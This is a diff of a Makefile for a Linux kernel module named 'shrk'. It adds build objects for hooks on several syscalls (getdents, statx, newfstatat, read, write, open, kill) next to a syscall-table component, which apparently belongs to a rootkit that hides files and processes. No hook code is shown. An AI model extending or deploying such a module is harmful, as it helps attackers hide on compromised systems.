@@ -10,11 +10,18 @@ EXTRA_CFLAGS += -DSHRK_DEBUG=$(SHRK_DEBUG)
 
 # kernel vars cant define with patsubst for some fucking reason
 obj-m := shrk.o 
-shrk-objs := main.o    \
-            util.o     \
-            systable.o \
-            hook.o     \
-            hooks/getdents.o
+shrk-objs := main.o        \
+        util.o             \
+        hook.o             \
+        systable.o         \
+        hooks/newfstatat.o \
+        hooks/getdents.o   \
+        hooks/statx.o      \
+        hooks/chdir.o      \
+        hooks/write.o      \
+        hooks/read.o       \
+        hooks/open.o       \
+        hooks/kill.o
 
 all: $(CSRCS) $(HSRCS)
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
